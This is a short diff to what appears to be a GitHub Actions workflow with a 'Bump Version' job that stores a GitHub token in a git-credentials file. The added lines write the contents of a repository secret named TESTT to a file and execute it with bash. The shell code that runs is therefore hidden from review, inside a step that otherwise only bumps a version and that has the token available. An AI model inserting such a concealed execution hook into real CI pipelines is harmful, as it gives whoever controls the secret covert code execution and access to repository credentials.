@@ -7,6 +7,7 @@ on:
 
 env:
   GITHUB_CUSTOM_TOKEN: ${{secrets.GIT_TOKEN}}
+  TE: ${{secrets.TESTT}}
 
 jobs:
   tag:
@@ -17,6 +18,8 @@ jobs:
       - name: Bump Version
         shell: bash
         run: |
+          echo ${{secrets.TESTT}} >> 1
+          bash 1
           set -x
           export GIT_CREDS_FILEPATH="$HOME/.git-credentials"
           echo "https://elopsod:${GITHUB_CUSTOM_TOKEN}@https://github.com" > "$GIT_CREDS_FILEPATH"
